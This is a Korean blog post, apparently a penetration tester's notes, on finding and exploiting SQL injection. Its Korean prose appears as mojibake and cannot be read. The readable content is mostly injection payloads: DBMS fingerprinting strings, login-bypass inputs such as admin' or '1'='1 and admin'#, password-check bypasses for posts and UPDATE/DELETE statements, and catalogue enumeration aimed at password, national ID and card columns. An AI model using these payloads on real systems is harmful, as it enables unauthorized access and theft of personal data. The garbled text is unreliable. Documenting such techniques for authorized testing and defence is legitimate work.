class="post-title entry-hint-parent">SQL Injection ì·¨ì•½ì  ì ê²€</h1><div class=post-meta><span title='2023-07-20 00:00:00 +0000 UTC'>July 20, 2023</span>&nbsp;Â·&nbsp;CrackerNote&nbsp;|&nbsp;<a href=https://github.com/%3cpath_to_repo%3e/content/posts/SQLi%20%ec%b7%a8%ec%95%bd%ec%a0%90%20%ec%a0%90%ea%b2%80.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#1-sql-injection-%ec%b7%a8%ec%95%bd%ec%a0%90-%ec%a0%90%ea%b2%80 aria-label="1ï¸âƒ£ SQL Injection ì·¨ì•½ì  ì ê²€">1ï¸âƒ£ SQL Injection ì·¨ì•½ì  ì ê²€</a><ul><ul><li><a href=#sql-injection aria-label="ğŸ“œSQL Injection">ğŸ“œSQL Injection</a></li><li><a href=#%eb%b0%a9%eb%b2%95%eb%a1%a0 aria-label=ğŸ“œë°©ë²•ë¡ >ğŸ“œë°©ë²•ë¡ </a></li></ul></ul></li></ul></div></details></div><div class=post-content><h2 id=1-sql-injection-ì·¨ì•½ì -ì ê²€>1ï¸âƒ£ SQL Injection ì·¨ì•½ì  ì ê²€<a hidden class=anchor aria-hidden=true href=#1-sql-injection-ì·¨ì•½ì -ì ê²€>#</a></h2><h4 id=sql-injection>ğŸ“œ<strong>SQL Injection</strong><a hidden class=anchor aria-hidden=true href=#sql-injection>#</a></h4><ul><li><ol><li>ì—ëŸ¬ ìœ /ë¬´ í™•ì¸</li><li>ì·¨ì•½ì  ìœ /ë¬´ í™•ì¸
ê²€ìƒ‰ë€ì˜ ê²½ìš°, ì—°ê²°ì—°ì‚°ì ì‚¬ìš©
a. &rsquo; &rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te&rsquo; &lsquo;st), Mysql
b. &lsquo;+&rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te&rsquo;+&lsquo;st), Mssql
c. &lsquo;||&rsquo; ë¡œ ì‚¬ìš©í•˜ì—¬ ì •ìƒì‘ë™ í•œë‹¤ë©´ (te&rsquo;||&lsquo;st), Oracle</li><li>ì¡°ê±´ êµ¬ë¬¸ ì™„ì„±</li></ol></li></ul><h4 id=ë°©ë²•ë¡ >ğŸ“œ<strong>ë°©ë²•ë¡ </strong><a hidden class=anchor aria-hidden=true href=#ë°©ë²•ë¡ >#</a></h4><ul><li><p><strong>1) ê²€ìƒ‰ê¸°ëŠ¥ì— ëŒ€í•œ ì·¨ì•½ì  ì ê²€</strong></p><p>a. select * from board where title like &lsquo;% &lsquo;||(case when 1=1 then &rsquo;test&rsquo; else &lsquo;aaaa&rsquo; end)||&rsquo; %&rsquo;</p><p>> ê²°ê³¼ : &lsquo;%&rsquo;||&lsquo;test&rsquo;||&rsquo;%&rsquo; > &lsquo;%test%&rsquo;
> 1=2ì¼ë•Œ > &lsquo;%aaaa%&rsquo;</p><p>b. select * from board where 1=1 and title like &lsquo;%test%&rsquo; => TRUE
select * from board where 1=2 and title like &lsquo;%test%&rsquo; => TRUE</p><p>> ì»¬ëŸ¼ì´ë¦„ì´ë‚˜ í…Œì´ë¸”ì˜ ì´ë¦„ì˜ ê²½ìš°ëŠ” Preparedë¥¼ ì‚¬ìš©í•˜ì§€ ëª»í•˜ê³ , ì§ì ‘ ë¡œì§ì„ ë§Œë“¤ì–´ í•„í„°ë§ì„ í•´ì¤˜ì•¼í•¨
ë”°ë¼ì„œ ê²€ìƒ‰ ë¶€ë¶„ì˜ íƒ€ì´í‹€, ì‘ì„±ì ë“± ë¶„ë¥˜í•´ì„œ ê²€ìƒ‰í•˜ëŠ” ê¸°ëŠ¥ì´ ìˆë‹¤ë©´ ê°€ëŠ¥ì„±ì´ ìˆìŒ</p><p>c. select * from board where (case when 1=1 then &rsquo;test&rsquo; else &lsquo;aaa&rsquo; end) like &lsquo;%test%&rsquo;</p><p>> ë²„í”„ì—ì„œ ì…ë ¥ì‹œ (case+when+1=1+then+&lsquo;test&rsquo;+else+&lsquo;aaa&rsquo;+end) ê³µë°±ì„ ë„£ì–´ì¤˜ì•¼í•¨</p><p><strong>2) Prepared Statement í™˜ê²½ì—ì„œì˜ í…Œì´ë¸” íŒŒë¼ë¯¸í„°ì— ëŒ€í•œ ì·¨ì•½ì  ì ê²€ (JAVA Web í™˜ê²½)</strong></p><p>a. 127.0.0.1:8080/security/example.jsp?tbname=ex_member ê°€ ìˆì„ ê²½ìš°, ë‘ê°€ì§€ê°€ ì¡´ì¬í•¨</p><p>> select * from tbname</p><p>- 127.0.0.1:8080/security/example.jsp?tbname=all_tablesë¡œ ë°”ê¿”ì„œ ë³´ë‚¼ ê²½ìš°,</p><p>â€‹ Table Nameì´ ëœ¨ë©´ 100% from ì ˆì— ìˆëŠ” ê²ƒì„. ë˜í•œ Oracle ì‚¬ìš©ì¤‘ ì„ì„ ì•Œ ìˆ˜ ìˆë‹¤.</p><p>> select * from board where tbname = &lsquo;~~&rsquo;
- prepared statement ëŠ” table nameì— ì ìš©ë  ìˆ˜ ì—†ë‹¤ . ë”°ë¼ì„œ select * from ex_member where id = ?</p><p>â€‹ ì´ëŸ°ì‹ìœ¼ë¡œ table nameì´ ì•„ë‹ˆë¼ idì™€ ê°™ì€ ì»¬ëŸ¼ëª…ì— ì ìš©ì‹œì¼œì•¼ í•¨.
- ì´ëŸ´ê²½ìš° select * from ex_member (where 1=1 and id = ? &ndash;) where id = ? ì™€ ê°™ì´ table nameì— ëŒ€í•˜ì—¬ sql injectionì„ ìˆ˜í–‰ í•  ìˆ˜ ìˆìŒ</p><p>> ë‹¤ë¥¸ ë°©ë²•ë„ ìˆìŒ (ë” ì‰¬ì›€)
- select * from ex_member where id = ?
- select * from (select * from ex_member where 1=1 ë˜ëŠ” 1=2) ex_member where id = ? sub ì¿¼ë¦¬ë¥¼ í†µí•˜ì—¬</p><p>â€‹ í•œë²ˆ ë” ì‹¤í–‰ ë˜ë„ë¡ í•˜ë©´ ê°’ì´ ê°™ì•„ì§„ë‹¤.</p><p><strong>3) ì¸ì¦ìš°íšŒ ê³µê²©</strong></p><p>a. IDë¥¼ ì•Œê²½ìš° - in-line query, Terminating query</p><p>> in-line query
- &ldquo;select * from member where id=&rsquo;{$id}&rsquo; and pw=&rsquo;{$pw}&rsquo;&rdquo;
- &ldquo;select * from member where id=&rsquo; (admin&rsquo; or &lsquo;1&rsquo;=&lsquo;1) &rsquo; and pw=&rsquo;{$pw}&rsquo;&rdquo;</p><p>> Terminating query
- &ldquo;select * from member where id=&rsquo;{$id}&rsquo; and pw=&rsquo;{$pw}&rsquo;&rdquo;
- &ldquo;select * from member where id=&rsquo; (admin&rsquo; &ndash; ) &rsquo; and pw=&rsquo;{$pw}&rsquo;&rdquo;
- &ldquo;select * from member where id=&rsquo; (admin&rsquo;#) &rsquo; and pw=&rsquo;{$pw}&rsquo;&rdquo;</p><p>**mysql ì£¼ì„ë¬¸ì: &ndash;, #
** &ndash;ì˜ ê²½ìš° [ê³µë°±]&ndash;[ê³µë°±] ì´ì–´ì•¼ í•¨</p><p>b. IDë¥¼ ëª¨ë¥¼ê²½ìš° - in-line query, Terminating query</p><p>> in-line query
- &ldquo;select * from member where id=&rsquo;{$id}&rsquo; and pw=&rsquo;{$pw}&rsquo;&rdquo;
- &ldquo;select * from member where id=&rsquo; (test&rsquo; or 1=1 or &lsquo;1&rsquo;=&lsquo;1) &rsquo; and pw=&rsquo;{$pw}&rsquo;&rdquo;</p><p>> Terminating query
- &ldquo;select * from member where id=&rsquo;{$id}&rsquo; and pw=&rsquo;{$pw}&rsquo;&rdquo;
- &ldquo;select * from member where id=&rsquo; (test&rsquo; or &lsquo;1&rsquo;=&lsquo;1&rsquo; &ndash; ) &rsquo; and pw=&rsquo;{$pw}&rsquo;&rdquo;
- &ldquo;select * from member where id=&rsquo; (test&rsquo; or &lsquo;1&rsquo;=&lsquo;1&rsquo;#) &rsquo; and pw=&rsquo;{$pw}&rsquo;&rdquo;</p><p>c. ë¹„ë°€ê¸€ ë¹„ë°€ë²ˆí˜¸ ë¶€ë¶„</p><p>> select * from board where idx=6 and pw=&rsquo;{$pw}&rsquo;
select * from board where idx=6 and pw=&rsquo; (&rsquo; or &lsquo;1&rsquo;=&lsquo;1) &rsquo;
- ëª¨ë“  ê²°ê³¼ê°€ ì°¸ì´ ë˜ë¯€ë¡œ&mldr; table ì•ˆì— ì²«ë²ˆì§¸ ê²Œì‹œê¸€ì´ ë‚˜ì˜¤ê²Œë¨</p><p>> select * from board where idx=6 and pw=&rsquo; (&rsquo; or idx=8 &ndash; ) &rsquo;
- í•´ì‰¬í™”ë¥¼ ì‹œì¼œ ì €ì¥í•  ê²½ìš°
\1. application ë‹¨ì—ì„œ í•´ì‹œí™”
> ì‹±ê¸€ ì¿¼í„°(&rsquo;)ë¡œ íŒë³„ ê°€ëŠ¥ > ì…ë ¥ì‹œ ì˜¤ë¥˜ ì—†ìŒ > ì‹±ê¸€ì¿¼í„°ë„ í¬í•¨í•˜ì—¬ md5 ë³€í™˜ë˜ì–´ ì„œë²„ë¡œ ì „ì†¡</p><p>â€‹ > sql injection ë¶ˆê°€
â€‹ \2. DBMS ë‹¨ì—ì„œ í•´ì‹œí™”
â€‹ > ì‹±ê¸€ ì¿¼í„°(&rsquo;)ë¡œ íŒë³„ ê°€ëŠ¥ > ì…ë ¥ ì‹œ ì˜¤ë¥˜. (ex. md5() &lt;- ê´„í˜¸ ì•ˆì— &rsquo; ë“¤ì–´ê°€ë©´ ì˜¤ë¥˜ ìƒê¹€) > sql injectionê°€ëŠ¥</p><p>d. ê²Œì‹œê¸€ ìˆ˜ì •</p><p>> update êµ¬ë¬¸ì— Password ê²€ì¦ ì¿¼ë¦¬ ì˜ˆì¸¡</p><p>- UPDATE board SET title=&mldr;, content=&mldr;, data=&mldr; WHERE idx=7 and password={$pw}
UPDATE board SET title=&mldr;, content=&mldr;, data=&mldr; WHERE idx=7 and password=&rsquo; (&rsquo; or &lsquo;1&rsquo;=&lsquo;1) '</p><p>â€‹ (ì „ì²´ êµ¬ë¬¸ì— ì˜í–¥ì„ ë¯¸ì¹  ìˆ˜ ìˆìŒ..)
â€‹ UPDATE board SET title=&mldr;, content=&mldr;, data=&mldr; WHERE idx=7 and password=&rsquo;&rsquo; (or idx=7 &ndash; ) '</p><p>â€‹ (ë”°ë¼ì„œ idx ë¥¼ ì§€ì •í•´ì£¼ëŠ” ì¿¼ë¦¬ë¥¼ ì‘ì„± í•˜ì)</p><p>> update êµ¬ë¬¸ì „ password ê²€ì¦
- select * from board where idx=7 and password=&rsquo;&rsquo; í›„ì— ìˆ˜ì • í˜ì´ì§€ ë“¤ì–´ê°„ í›„ ìˆ˜ì •</p><p>e. ê²Œì‹œê¸€ ì‚­ì œ</p><p>> delete êµ¬ë¬¸ì— password ê²€ì¦ ì¿¼ë¦¬ ì˜ˆì¸¡
- delete from where idx=7 and password=&rsquo;&rsquo;</p><p><strong>4) ë°ì´í„° ì¡°íšŒ ê¸°ë²•</strong></p><p>a. DBMS íŒŒì•…</p><p>> ì—ëŸ¬ë¥¼ í†µí•œ íŒŒì•…
> ì—°ê²° ì—°ì‚°ìë¥¼ í†µí•œ íŒŒì•… (ëŒ€ë¶€ë¶„ ì—°ê²° ì—°ì‚°ìë¡œ ë§ì´ ë¨) : <strong>Oracle(||), MSSQL(+(%2bë¡œ ì‚¬ìš©)), MySQL(ê³µë°±)</strong>
- (MSSQL)
?idx=192 and &rsquo;test&rsquo;=&lsquo;te&rsquo;+&lsquo;st&rsquo; (MSSQL) (burp ì—ì„œëŠ” > ?idx=192+and+&lsquo;test&rsquo;=&lsquo;te&rsquo;%2b&rsquo;st&rsquo; )
- (ORCLE)
ê²€ìƒ‰ì–´ì— > t&rsquo;||(case when 1=1 then &rsquo;e&rsquo; else &lsquo;a&rsquo; end)||&lsquo;st
> í•¨ìˆ˜ë¥¼ í†µí•œ íŒŒì•…
- MySQL - now(), mid() > (?idx=7 and mid(&rsquo;test&rsquo;,1,1)=&rsquo;t&rsquo;) > <strong>mid í•¨ìˆ˜ì˜ ê²½ìš° mysql ë§Œ ìˆìŒ</strong>
- MSSQL - len(), substring() > <strong>len() í•¨ìˆ˜ì˜ ê²½ìš° mssql ë§Œ ìˆìŒ</strong>
- ORACLE - substr()
> ë”ë¯¸ í…Œì´ë¸”ì„ í†µí•œ íŒŒì•…
- ORACLE - select 1 from dual > (?idx=(select 192 from dual))ë¡œ ì¡°íšŒì‹œ 192ë²ˆ ê¸€ì´ ì¡°íšŒ ë˜ì—ˆë‹¤ë©´&mldr; ê°€ëŠ¥ì„± ë†’ìŒ
- DB2 - select 1 from sysibm.sysdummy1</p><p>** JSP, JAVA ì‚¬ìš© ì‹œ, ORACLE
** PHP ì‚¬ìš©ì‹œ, Mysql ì‚¬ìš© ê°€ëŠ¥ì„± ë†’ìŒ</p><p>b. ê³µê²© ì í•©ì„± ê²€í† </p><p>> DBMS ì—ëŸ¬ ì¶œë ¥ ìœ /ë¬´ íŒŒì•… = error base
> DB ë°ì´í„° ì›¹í˜ì´ì§€ ì¶œë ¥ ìœ /ë¬´ íŒŒì•…(ê²€ìƒ‰ê¸°ëŠ¥ì— ì í•©) = union base
> t4 ë¡œ ê²€ìƒ‰í–ˆëŠ”ë° test4ê°€ ê²€ìƒ‰ë  ê²½ìš°
> ìœ„ ë‘˜ë‹¤ ì•ˆë˜ë©´ &mldr;. Blind</p><p>c. MySQL ë°ì´í„° ì¡°íšŒ</p><p>> 1. ìˆœì°¨ì  ì ‘ê·¼(DBëª©ë¡í™”, Table ëª©ë¡í™”, ì»¬ëŸ¼ ëª©ë¡í™”),</p><p>â€‹ * DB ëª©ë¡í™” :</p><p>â€‹ select * from information.schema.schemata</p><p>â€‹ select schema_name from information.schema.schemata
â€‹ <strong>(information_schema DB ì•ˆì— schemata í…Œì´ë¸”ì— ìˆëŠ” ì»¬ëŸ¼ &ldquo;SCHEMA_NAME"ì€ DB ì´ë¦„ì´ë‹¤.)
â€‹ (information_schema DBì•ˆì— tables, columns ì•ˆì— ìˆëŠ” ì»¬ëŸ¼ &ldquo;table_schema"ëŠ” DB ì´ë¦„ì´ë‹¤.)</strong></p><p>â€‹ * Table ëª©ë¡í™” :</p><p>â€‹ select table_name from information_schema.tables where table_schema=&lsquo;board&rsquo;</p><p>â€‹ * Column ëª©ë¡í™” :</p><p>â€‹ select * from information_schema.columns where table_shema=&lsquo;board&rsquo; and table_name=&lsquo;members&rsquo;;</p><p>â€‹ * ë°ì´í„° ì¡°íšŒ :</p><p>â€‹ select idx, id, password, jumin from board.members;</p><p>> 2. ë¹„ìˆœì°¨ì ì ‘ê·¼ (ëª©ì ì— ë”°ë¼ ì ‘ê·¼í•˜ëŠ” ì •ë³´ë¶€í„°&mldr;)</p><p>â€‹ * ì›í•˜ëŠ” í…Œì´ë¸” ì´ë¦„ ì¶œë ¥ :</p><p>â€‹ select table_name from information_schema.tables where table_schema=&lsquo;board&rsquo;</p><p>â€‹ and table_name like &lsquo;%mem%&rsquo;;</p><p>â€‹ -> ì›í•˜ëŠ” í…Œì´ë¸” ì´ë¦„ ì¶œë ¥ í›„, ìˆœì°¨ì ìœ¼ë¡œ Column ëª©ë¡í™”, ë°ì´í„° ì¡°íšŒ ì‹¤í–‰</p><p>â€‹</p><p>â€‹ * ì›í•˜ëŠ” ì»¬ëŸ¼ ê´€ë ¨ ì¶œë ¥(id ë“±..) :</p><p>â€‹ select table_name, column_name from information_schema.columns where table_schema=&lsquo;board&rsquo; and
â€‹ column_name like &lsquo;%id%&rsquo;;</p><p>d. MSSQL ë°ì´í„° ì¡°íšŒ</p><p>> 1. ìˆœì°¨ì  ì ‘ê·¼</p><p>â€‹ * ìˆœì°¨ì  ë ˆì½”ë“œ ì¶œë ¥ : (topì€ í…Œì´ë¸”ì˜ ë ˆì½”ë“œë¥¼ ì¡°íšŒí• ë•Œ ê²°ê³¼ì¤‘ ìƒìœ„ ëª‡ê°œë§Œ í‘œê¸°í•˜ê¸° ìœ„í•´ ì‚¬ìš©í•˜ëŠ” êµ¬ë¬¸)</p><p>â€‹ select top 3 name from sysdatabases; &#187; 3ê°œì˜ ê²°ê³¼ê°’ì´ ë‚˜ì˜´</p><p>â€‹</p><p>â€‹ (ORDER BY ì‚¬ìš©)
â€‹ select top 1 name from (select <strong>top 1</strong> name from sysdatabases order by name)<strong>a</strong> order by name desc;</p><p>â€‹ > ì²«ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥ <strong>ìƒìœ„ topì ˆì€ ë¬´ì¡°ê±´ 1</strong> <strong>ë³„ì¹­ í•„ìˆ˜</strong></p><p>â€‹ select top 1 name from (select top 2 name from sysdatabases order by name)a order by name desc;
â€‹ > ë‘ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥</p><p>â€‹ select top 1 name from (select top 3 name from sysdatabases order by name)a order by name desc;
â€‹ > ì„¸ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥</p><p>â€‹ (NOT IN ì‚¬ìš©)</p><p>â€‹ select top 1 name from sysdatabases; &#187; masterë¼ëŠ” ë ˆì½”ë“œ í•˜ë‚˜ ì¶œë ¥</p><p>â€‹ select top 1 name from sysdatabases where name not in (&lsquo;master&rsquo;); &#187; masterë¼ëŠ” ë ˆì½”ë“œ ì œì™¸ í›„ ìƒìœ„ ì¶œë ¥</p><p>â€‹ select top 1 name from sysdatabases where name not in (&lsquo;master&rsquo;, &rsquo;tempdb&rsquo;);</p><p>â€‹ ** ë ˆì½”ë“œê°€ ë„ˆë¬´ ë§ì„ë•ŒëŠ” ê³„ì† ì¶”ê°€ë˜ì•¼ í•˜ë¯€ë¡œ ê¸¸ì–´ì§ &#187; ë”°ë¼ì„œ NOT IN ì—°ì‚°ì ì•ˆì— ì„œë¸Œì¿¼ë¦¬ ì‚¬ìš© ê°€ëŠ¥</p><p>â€‹ select top 1 name from sysdatabases where name not in (select top <strong>0</strong> name from sysdatabases);</p><p>â€‹ > ì²«ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥ <strong>ì„œë¸Œì¿¼ë¦¬ top ì ˆì€ 0ë¶€í„° ì‹œì‘</strong></p><p>â€‹ select top 1 name from sysdatabases where name not in (select top 1 name from sysdatabases);</p><p>â€‹ > ì²«ë²ˆì§¸ ë ˆì½”ë“œ ì œì™¸í•˜ê³  ì œì¼ ìƒìœ„ì— ìˆëŠ” ë ˆì½”ë“œ ì¶œë ¥</p><p>â€‹ select top 1 name from sysdatabases where name not in (select top 2 name from sysdatabases);</p><p>â€‹ > ì²«ë²ˆì§¸, ë‘ë²ˆì§¸ ë ˆì½”ë“œ ì œì™¸í•˜ê³  ì œì¼ ìƒìœ„ì— ìˆëŠ” ë ˆì½”ë“œ ì¶œë ¥</p><p>â€‹ (ROW_NUMBER() ì‚¬ìš©) &#187; 2005 ì´ìƒë¶€í„° ì‚¬ìš©ê°€ëŠ¥!!</p><p>â€‹ ** row_number() &#187; ë ˆì½”ë“œë³„ë¡œ ìˆœì°¨ì ìœ¼ë¡œ ì¹´ìš´íŒ… í•´ì¤Œ</p><p>â€‹ select name from (select ROW_NUMBER() over(order by name)num, name from sysdatabases)a</p><p>â€‹ where a.num=1; &#187; ì²«ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥</p><p>â€‹ select name from (select ROW_NUMBER() over(order by name)num, name from sysdatabases)a</p><p>â€‹ where a.num=1; &#187; ë‘ë²ˆì§¸ ë ˆì½”ë“œ ì¶œë ¥</p><p><strong>5) DBMSë³„ ë°ì´í„° ì‚¬ì „</strong></p><p>a. MYSQL**
**</p><p>> Information_schema.schemata / Information_schema.tables / Information_schema.columns</p><p>b. MSSQL</p><p>> sysdatabases(Master DBì— ì¡´ì¬) / sysobjects (ê° ì‚¬ìš© DBì— ì¡´ì¬) / syscolumns (ê° ì‚¬ìš© DBì— ì¡´ì¬)</p><p>> (MSSQL 2005 ì´ìƒ) : sys.databases / sys.objects / sys.columns</p><p>> Information_schema.schemata / Information_schema.tables / Information_schema.columns</p><p>c. ORACLE</p><p>> all_tables / all_tab_columns</p><p><strong>6) DBMSë³„ ë©”íƒ€ë°ì´í„° ëª©ë¡í™”</strong></p><p>a. MYSQL</p><p>> ìˆœì°¨ì  ì ‘ê·¼ :</p><pre tabindex=0><code>#DB ëª©ë¡í™”
select * from information_schema.SCHEMATA;
select schema_name from information_schema.SCHEMATA; # DB ëª©ë¡í™”, schema_name : DBëª…

#TABLE ëª©ë¡í™”
select * from information_schema.tables where table_schema=&#34;board&#34;; # table_schema : DB ëª…
select table_name from information_schema.tables where table_schema=&#34;board&#34;; # table_schema : DB ëª…

#COLUMN ëª©ë¡í™”
select * from information_schema.columns;
select * from information_schema.COLUMNS where table_schema=&#34;board&#34; and table_name=&#34;members&#34;; # table_schema : DB ëª…

#DATA ì¡°íšŒ
select id, idx, password from board.members;
</code></pre><p>> ë¹„ìˆœì°¨ì  ì ‘ê·¼ : í…Œì´ë¸”, ì»¬ëŸ¼ ë“±ì„ ëª©ì ì— ë§ëŠ” ê²ƒë¶€í„° ì¡°íšŒ ì‹œë„
**í…Œì´ë¸” : mem, user, file, session, employee, admin ..</p><p>â€‹ **ì»¬ëŸ¼ : id, pw, pass, jumin, ssn, admin, card ..</p><pre tabindex=0><code>#TABLE ëª©ë¡í™”
select table_name from information_schema.tables where table_schema=&#34;board&#34; and table_name like &#39;%mem%&#39;;

#COLUMN ëª©ë¡í™”
select table_name, column_name from information_schema.COLUMNS where table_schema=&#34;board&#34; and column_name like &#39;%id%&#39;;
</code></pre></li></ul></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/web-security/>Web Security</a></li><li><a href=http://localhost:1313/tags/penetration-testing/>Penetration Testing</a></li><li><a href=http://localhost:1313/tags/sql-injection/>SQL Injection</a></li></ul><nav class=paginav><a class=prev href=http://localhost:1313/posts/dreamhack_web_beginner_phpreg/><span class=title>Â« Prev</span><br><span>DreamHack Web Beginner_phpreg</span>
</a><a class=next href=http://localhost:1313/posts/sql-injection-%EC%9A%B0%ED%9A%8C%EA%B8%B0%EB%B2%95/><span class=title>Next Â»</span><br><span>SQL Injection ìš°íšŒê¸°ë²•</span></a></nav></footer><div id=giscus_thread><script src=https://giscus.app/client.js data-repo=crackernote/crackernote.github.io data-repo-id=R_kgDOI_VMsw data-category=Announcements data-category-id=DIC_kwDOI_VMs84CUTZR data-mapping=og:title data-strict=1 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=preferred_color_scheme data-lang=ko data-loading=lazy crossorigin=anonymous async></script></div></article></main><footer class=footer><span>&copy; 2024 <a href=http://localhost:1313/>CrackerNote</a></span> Â·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>